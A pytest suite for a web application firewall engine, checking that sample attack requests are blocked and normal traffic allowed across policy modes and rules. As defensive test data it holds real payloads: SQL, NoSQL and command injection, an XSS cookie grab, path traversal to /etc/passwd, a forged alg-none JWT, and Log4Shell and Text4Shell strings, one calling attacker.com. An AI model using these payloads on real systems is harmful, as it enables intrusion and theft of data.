"""Tests for app.waf_engine — known attack snapshots -> expected BLOCK/ALLOW + attack_type."""

import asyncio

import pytest

from app import waf_engine, policy


NORMAL_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                   '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
}

_ip_counter = 0


def _next_ip():
    """Each test gets a fresh IP so rate-limiter / anti-bot velocity state
    from other tests doesn't bleed in."""
    global _ip_counter
    _ip_counter += 1
    return f'198.51.100.{_ip_counter}'


def _request(method='GET', url='/', headers=None, body='', ip=None):
    return {
        'method': method,
        'url': url,
        'headers': {**NORMAL_HEADERS, **(headers or {})},
        'body': body,
        'ip': ip or _next_ip(),
    }


def _analyze(request_data):
    return asyncio.run(waf_engine.analyze(request_data))


@pytest.fixture(autouse=True)
def reset_engine_state():
    waf_engine.reset_stats()
    yield
    waf_engine.reset_stats()


# ── Normal traffic ───────────────────────────────────────────────────────────

def test_normal_get_request_is_allowed():
    result = _analyze(_request(url='/tienda1/publico/productos.jsp?id=1&page=2'))
    assert result['decision'] == 'ALLOW'
    assert result['attack_type'] == 'normal'
    assert result['blocked_by'] is None


def test_normal_post_json_request_is_allowed():
    result = _analyze(_request(
        method='POST', url='/rest/user/login',
        headers={'Content-Type': 'application/json'},
        body='{"email":"user@example.com","password":"hunter2"}',
    ))
    assert result['decision'] == 'ALLOW'


# ── SQL Injection ────────────────────────────────────────────────────────────

def test_sqli_tautology_is_blocked():
    result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'sqli'


def test_sqli_union_select_is_blocked():
    result = _analyze(_request(
        url="/products?id=1 UNION SELECT username,password FROM users--"
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'sqli'


# ── XSS ──────────────────────────────────────────────────────────────────────

def test_xss_script_tag_is_blocked():
    result = _analyze(_request(url="/search?q=<script>alert(document.cookie)</script>"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'xss'


# ── Path traversal ───────────────────────────────────────────────────────────

def test_path_traversal_is_blocked():
    result = _analyze(_request(url="/download?file=../../../../etc/passwd"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'path_traversal'


# ── Command injection ────────────────────────────────────────────────────────

def test_cmd_injection_is_blocked():
    result = _analyze(_request(url="/ping?host=localhost; cat /etc/passwd"))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'cmd_injection'


# ── NoSQL injection (dedicated middleware, stage 6) ──────────────────────────

def test_nosql_injection_is_blocked():
    result = _analyze(_request(
        method='POST', url='/login',
        headers={'Content-Type': 'application/json'},
        body='{"username": {"$ne": null}, "password": {"$ne": null}}',
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'nosql_injection'
    assert result['blocked_by'] == 'nosql_injection'


# ── JWT abuse (dedicated middleware, stage 7) ────────────────────────────────

def test_jwt_alg_none_is_blocked():
    token = (
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.'
        'eyJpZCI6MSwicm9sZSI6ImFkbWluIn0.'
    )
    result = _analyze(_request(
        url='/rest/user/whoami',
        headers={'Authorization': f'Bearer {token}'},
    ))
    assert result['decision'] == 'BLOCK'
    assert result['attack_type'] == 'jwt_abuse'
    assert result['blocked_by'] == 'jwt_abuse'


# ── IPS signatures ────────────────────────────────────────────────────────────

def test_log4shell_jndi_payload_is_blocked():
    result = _analyze(_request(
        url='/api/login',
        headers={'X-Api-Version': '${jndi:ldap://attacker.com/a}'},
    ))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'ips'


def test_text4shell_script_interpolation_is_blocked():
    result = _analyze(_request(
        method='POST', url='/api/profile',
        headers={'Content-Type': 'application/json'},
        body='{"name": "${script:javascript:java.lang.Runtime.getRuntime().exec(\'id\')}"}',
    ))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'ips'


# ── Anti-bot ──────────────────────────────────────────────────────────────────

def test_known_scanner_ua_is_blocked():
    result = _analyze(_request(url='/admin', headers={'User-Agent': 'sqlmap/1.7.8#stable'}))
    assert result['decision'] == 'BLOCK'
    assert result['blocked_by'] == 'anti_bot'


# ── Stats tracking ────────────────────────────────────────────────────────────

# ── Configurable thresholds (PUT /policy/thresholds) ─────────────────────────

class _FakeModel:
    """Stand-in for the trained model with a fixed malicious-class probability."""

    def __init__(self, malicious_score):
        self._malicious_score = malicious_score

    def predict_proba(self, X):
        return [[1 - self._malicious_score, self._malicious_score]]


def test_ml_block_score_threshold_is_honored(monkeypatch):
    """A request scoring 0.794 (below the old hardcoded 0.90 cutoff) should be
    BLOCKed once ml_block_score is configured below that score."""
    monkeypatch.setattr(waf_engine, '_model', _FakeModel(0.794))

    original = policy.get_thresholds().get('ml_block_score')
    try:
        # With the configured default (0.50), 0.794 should already block.
        policy.update_policy({'thresholds': {'ml_block_score': 0.50}})
        result = _analyze(_request(url='/tienda1/publico/productos.jsp?id=1&page=2'))
        assert result['ml_score'] == pytest.approx(0.794)
        assert result['decision'] == 'BLOCK'
        assert result['blocked_by'] == 'ml_waf'

        # Raising the threshold above 0.794 should now allow the same score.
        policy.update_policy({'thresholds': {'ml_block_score': 0.85}})
        result = _analyze(_request(url='/tienda1/publico/productos.jsp?id=1&page=2'))
        assert result['ml_score'] == pytest.approx(0.794)
        assert result['decision'] == 'ALLOW'
    finally:
        policy.update_policy({'thresholds': {'ml_block_score': original}})


def test_stats_track_blocked_and_allowed_counts():
    _analyze(_request(url='/tienda1/publico/productos.jsp'))
    _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))

    stats = waf_engine.get_stats()
    assert stats['total'] == 2
    assert stats['blocked'] == 1
    assert stats['allowed'] == 1
    assert stats['attack_counts'].get('sqli') == 1


# ── Policy mode (prevent/detect/monitor) ───────────────────────────────────────

def _with_mode(mode):
    original = policy.get_policy().get('mode', 'prevent')
    policy.update_policy({'mode': mode})
    return original


def test_detect_mode_allows_but_flags_attack():
    original = _with_mode('detect')
    try:
        result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))
        assert result['decision'] == 'ALLOW'
        assert result['would_block'] is True
        assert result['attack_type'] == 'sqli'
        assert result['blocked_by'] == 'ml_waf'
    finally:
        policy.update_policy({'mode': original})


def test_monitor_mode_allows_but_flags_attack():
    original = _with_mode('monitor')
    try:
        result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))
        assert result['decision'] == 'ALLOW'
        assert result['would_block'] is True
    finally:
        policy.update_policy({'mode': original})


def test_prevent_mode_still_blocks():
    original = _with_mode('prevent')
    try:
        result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1"))
        assert result['decision'] == 'BLOCK'
        assert 'would_block' not in result
    finally:
        policy.update_policy({'mode': original})


# ── Policy IP/path rules ────────────────────────────────────────────────────────

def test_ip_blocklist_blocks_request_in_prevent_mode():
    ip = _next_ip()
    policy.add_rule('ip_blocklist', ip)
    try:
        result = _analyze(_request(url='/', ip=ip))
        assert result['decision'] == 'BLOCK'
        assert result['blocked_by'] == 'policy'
    finally:
        policy.remove_rule('ip_blocklist', ip)


def test_ip_allowlist_overrides_attack_signature():
    ip = _next_ip()
    policy.add_rule('ip_allowlist', ip)
    try:
        result = _analyze(_request(url="/login?user=admin&pass=' OR '1'='1", ip=ip))
        assert result['decision'] == 'ALLOW'
        assert result['modules']['policy']['action'] == 'allow'
    finally:
        policy.remove_rule('ip_allowlist', ip)


def test_path_blocklist_blocks_request_in_prevent_mode():
    policy.add_rule('path_blocklist', r'^/secret')
    try:
        result = _analyze(_request(url='/secret/data'))
        assert result['decision'] == 'BLOCK'
        assert result['blocked_by'] == 'policy'
    finally:
        policy.remove_rule('path_blocklist', r'^/secret')
